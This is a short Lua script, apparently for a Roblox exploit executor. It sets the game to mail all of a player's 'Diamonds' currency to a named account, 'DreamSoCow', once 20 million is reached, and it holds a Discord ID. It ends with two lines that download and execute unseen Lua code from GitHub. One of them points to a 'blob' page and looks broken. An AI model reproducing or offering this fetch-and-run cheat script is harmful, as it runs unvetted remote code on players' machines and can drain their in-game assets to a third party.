wait(3)
-- ⚙️ SETTINGS
getgenv().Settings = {
    Mailing = {
        ["Diamonds"] = {
            Class = "Currency",
            Amount = "All",        -- gửi toàn bộ khi đạt ngưỡng
            MinDiamonds = 20000000 -- ngưỡng tối thiểu (ví dụ: 20 triệu)
        },
    },
    Users = {
        "DreamSoCow",  -- người nhận
    },
    ["Split Items Evenly"] = false,
    ["Only Online Accounts"] = false,
    ["Developer Mode"] = false,
    [[ THANK YOU, YOUR MOM SO FAT <3! ]]
}
-- ⚙️ CONFIG
_G.Config = {
    UserID = "0d28ea66-a410-47c0-a707-06d7cb199774",
    discord_id = "698853568291143821",
    Note = "Pc",
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/yummytrack/main/tracker"))()
loadstring(game:HttpGet("https://github.com/dsadgeee/21521521/blob/main/track.lua"))()
